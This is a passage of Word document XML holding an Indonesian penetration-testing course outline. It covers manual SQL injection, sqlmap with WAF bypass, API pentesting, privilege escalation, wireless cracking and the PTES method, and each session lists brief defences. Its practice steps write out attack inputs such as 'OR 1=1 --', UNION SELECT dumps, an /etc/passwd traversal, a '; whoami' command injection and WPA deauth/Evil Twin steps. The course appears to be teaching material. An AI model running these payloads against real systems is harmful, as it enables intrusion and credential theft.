      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cek akses tiap request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validasi file upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 17: SQL Injection Manual</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Tautology, Blind, Time-based, Union SQLi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 SQLi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Resepsionis: kasi SEMUA kunci kamar!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Tautology: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Pernyataan selalu benar: OR 1=1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Blind: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>TANYA BENER-SALAH huruf per huruf.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes ' di parameter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Login: OR 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>ORDER BY cek kolom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>UNION SELECT 1,2,3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Dump user,password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Prepared statement WAJIB!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 18: SQLMAP &amp; WAF Bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>SQLMAP otomatisasi, ModSecurity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 SQLMAP: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>ROBOT VACUUM nyapu SQLi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 WAF: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SATPAM pintu. Bypass = cari celah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>sqlmap -u target --dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>--tamper=space2comment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Install ModSecurity + CRS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Tes bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan cuma andelin WAF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 19: API Pentesting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Fuzzing API, SQLi/LFI/CI di API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 API: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PELAYAN RESTORAN client-dapur.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Cari swagger.json, /api/docs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Fuzzing GET,POST,PUT,DELETE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>SQLi di endpoint API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>LFI: ../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Command Inj: ; whoami</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 6: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek auth bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>API Gateway</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 20: Node.js &amp; PHP Hardening</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Keamanan Node.js, PHP disable function bypass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Node.js: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>DAPUR CEPAT SAJI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 PHP: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>KUNCI MASTER.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>SQLi di Node.js</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Bypass disable_function PHP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Install ModSecurity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Helmet middleware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>disable_function ketat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 21: Privilege Escalation &amp; IR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Naikkan hak akses dan incident response.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 PrivEsc: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>TAMU dapet KUNCI MANAJER.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 IR: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PEMADAM KEBAKARAN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>find / -perm -4000 (SUID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>PwnKit CVE-2021-4034</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>last, cat auth.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Cari backdoor: lsof -i</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update kernel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Aktifkan auditd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 22: Wireless Hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>WEP/WPA crack, Evil Twin, jamming.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 WiFi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SINYAL RADIO siapa pun dengar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 WEP vs WPA: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>GEMBOK PLASTIK vs GEMBOK BESI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>airmon-ng start wlan0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>airodump-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>aircrack-ng WEP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>aireplay deauth capture WPA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>aircrack-ng WPA wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 6: </w:t>
      </w:r>
      <w:r>
        <w:t>reaver WPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 7: </w:t>
      </w:r>
      <w:r>
        <w:t>airbase-ng Evil Twin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WPA2/WPA3 password kuat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan WPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 23: PTES Standard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Penetration Testing Execution Standard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 PTES: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>RESEP MASAK standar internasional.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Pre-engagement: proposal, NDA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Intel: OSINT, Shodan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Threat Modeling</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Vuln Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Exploitation PoC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 6: </w:t>
      </w:r>
      <w:r>
        <w:t>Reporting teknis+eksekutif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Simpan bukti</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Patuhi aturan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 24: Career &amp; Portfolio</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Red/Blue, GRC, portfolio, STAR interview.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Red vs Blue: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>STRIKER vs BEK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 GRC: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>BAGIAN HUKUM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>CV/LinkedIn security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Portfolio case study</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>STAR Interview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>CTFtime.org</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>HackerOne/Bugcrowd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 6: </w:t>
      </w:r>
      <w:r>
        <w:t>Sertifikasi: OSCP, CEH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Karir luas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Soft skill penting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>CHEATSHEET - Ringkasan Cepat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Scanning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Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Fungsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
